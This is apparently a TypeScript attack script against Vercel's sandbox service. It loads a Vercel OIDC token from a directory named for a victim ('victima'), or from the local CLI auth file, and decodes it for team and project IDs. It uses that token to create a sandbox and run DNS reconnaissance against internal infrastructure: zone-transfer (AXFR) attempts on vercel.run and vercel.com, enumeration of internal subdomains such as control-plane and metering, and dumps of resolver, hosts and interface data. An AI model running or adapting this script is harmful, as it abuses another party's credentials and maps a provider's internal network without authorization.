import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "dns-probe-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const SCRIPT = `
set +e
echo "===== resolver interno 172.31.0.2 ====="
echo "--- NS de vercel.run ---"
dig +short NS vercel.run @172.31.0.2 2>&1
echo "--- NS de vercel.com ---"
dig +short NS vercel.com @172.31.0.2 2>&1
echo "--- NS autoritativo del sb domain ---"
dig +short NS sb-4j0y9rk6yws9.vercel.run @172.31.0.2 2>&1
echo ""
echo "===== resolver /etc/resolv.conf actual ====="
cat /etc/resolv.conf
echo ""
echo "===== consultar NS autoritativo directo (los NS de vercel.run) ====="
NS=$(dig +short NS vercel.run @172.31.0.2 2>/dev/null | head -3)
echo "NS list: $NS"
for ns in $NS; do
  echo "--- consultar $ns ---"
  echo -n "  A sb-4j0y9rk6yws9: "; dig +short A sb-4j0y9rk6yws9.vercel.run @$ns 2>&1 | tr '\n' ' '; echo ""
  echo -n "  ANY sb-...: "; dig +short ANY sb-4j0y9rk6yws9.vercel.run @$ns 2>&1 | tr '\n' ' '; echo ""
  echo -n "  AXFR vercel.run: "; dig +short AXFR vercel.run @$ns 2>&1 | head -3 | tr '\n' ' '; echo ""
  echo -n "  AXFR vercel.com: "; dig +short AXFR vercel.com @$ns 2>&1 | head -3 | tr '\n' ' '; echo ""
done
echo ""
echo "===== nombres internos que podrian existir (wildcard / subdominios) ====="
for sub in api control-plane control plane gateway cell sandbox-api sb gateway-internal metering logs metrics; do
  echo -n "  $sub.vercel.run: "; dig +short A $sub.vercel.run @172.31.0.2 2>&1 | tr '\n' ' '; echo ""
done
echo ""
echo "===== IPs que nos asignaron (red celda) ====="
ip -o addr | grep eth0
echo "===== DNS search domains / hosts file ====="
cat /etc/hosts
echo "===== DONE ====="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 60_000 });
  console.log(await r.output("both"));
  console.log("NAME=" + (sbx as any).name);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });